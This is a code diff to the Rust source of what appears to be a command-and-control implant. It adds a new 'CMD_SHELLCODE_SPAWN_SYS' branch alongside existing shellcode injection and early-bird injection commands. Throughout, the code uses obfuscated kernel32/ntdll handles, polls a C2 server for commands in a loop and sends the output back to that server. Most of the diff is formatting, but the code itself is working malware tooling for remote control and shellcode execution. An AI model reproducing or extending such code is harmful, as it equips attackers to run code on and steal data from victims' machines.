@@ -85,7 +85,7 @@ fn process_command(
     base_url: &str,
     cookie_header: &reqwest::header::HeaderValue,
     kernel32: &obf_kernel32,
-    ntdll: &obf_ntdll
+    ntdll: &obf_ntdll,
 ) -> String {
     // get the commands out into a vector
     let cmd_vec = cmd_str.split(":::").collect::<Vec<_>>();
@@ -107,7 +107,19 @@ fn process_command(
                 file_name,
                 mem_perms,
                 kernel32,
-                ntdll
+                ntdll,
+            );
+        }
+        "CMD_SHELLCODE_SPAWN_SYS" => {
+            let file_name = cmd_vec[2];
+            let mem_perms = cmd_vec[3];
+            return commands::command::shellcode_spawn_sys(
+                base_url,
+                cookie_header,
+                file_name,
+                mem_perms,
+                kernel32,
+                ntdll,
             );
         }
         "CMD_SHELLCODE_INJECT" => {
@@ -121,7 +133,7 @@ fn process_command(
                 pid,
                 mem_perms,
                 kernel32,
-                ntdll
+                ntdll,
             );
         }
         "CMD_SHELLCODE_EARLYBIRD" => {
@@ -133,7 +145,7 @@ fn process_command(
                 file_name,
                 mem_perms,
                 kernel32,
-                ntdll
+                ntdll,
             );
         }
         "CMD_KILL" => {
@@ -186,7 +198,6 @@ fn send_response(
 }
 
 fn main() {
-
     // println!("THIS IS HERE");
 
     let hostname = whoami::hostname();
@@ -217,12 +228,17 @@ fn main() {
         let cmd_str = request_command(&*base_url, &cookie_header);
 
         // Run the command and catch output
-        let cmd_output = process_command(&cmd_str, &base_url, &cookie_header, &OBF_KERNEL32, &OBF_NTDLL);
+        let cmd_output = process_command(
+            &cmd_str,
+            &base_url,
+            &cookie_header,
+            &OBF_KERNEL32,
+            &OBF_NTDLL,
+        );
 
         // Send output back to C2 server
         send_response(&*base_url, &cookie_header, &cmd_output, &cmd_str);
 
         std::thread::sleep(std::time::Duration::from_secs(SLEEP_TIME))
     }
-
 }
